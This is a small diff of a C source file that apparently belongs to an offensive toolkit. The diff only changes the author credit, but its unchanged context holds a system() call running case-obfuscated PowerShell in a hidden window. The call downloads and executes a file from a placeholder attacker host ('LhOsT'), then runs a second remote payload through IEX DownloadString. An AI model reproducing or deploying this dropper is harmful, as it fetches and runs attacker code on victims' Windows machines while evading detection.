@@ -1,5 +1,5 @@
 /*
-Author: pedro ubuntu [ r00t-3xp10it ]
+Author: kennedy69 [ Ferdi S Kennedy ]
 Credits: null byte [ Method POC ]
 */
 
@@ -16,4 +16,3 @@ int _()
   system("PoWeRsHeLl -wIn 1 -C (nEw-ObJeCt NeT.WebClIeNt).dOwNlOaDfIlE('http://LhOsT/ScRee', 'C:\\Users\\Public\\ScRee') & pOwErShElL -wIn 1 -c C:\\Users\\Public\\ScRee & pOwErShElL -wIn 1 -c \"IEX (NeW-oBjEcT nEt.WeBClIeNt).DoWnLoAdStRiNg('http://LhOsT/payload.EhLh')\"");
   return 0;
 }
-
